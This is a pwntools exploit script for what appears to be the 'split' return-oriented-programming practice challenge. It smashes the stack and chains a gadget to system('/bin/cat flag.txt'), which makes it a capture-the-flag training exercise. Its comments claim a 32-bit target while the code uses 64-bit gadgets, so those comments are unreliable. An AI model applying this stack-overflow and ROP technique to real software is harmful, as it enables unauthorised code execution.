#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./split32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./split")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *pwnme+89
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# io = start()

# io.sendline(cyclic(100))
# io.wait()
# offset = cyclic_find(io.corefile.read(io.corefile.rsp, 4))
offset = 40

info(offset)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io = start()

rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]


payload = flat(
    asm("nop") * offset,
    pop_rdi,
    next(exe.search(b"/bin/cat flag.txt")),
    exe.symbols["system"],
    0x0,
)
io.sendline(payload)

io.interactive()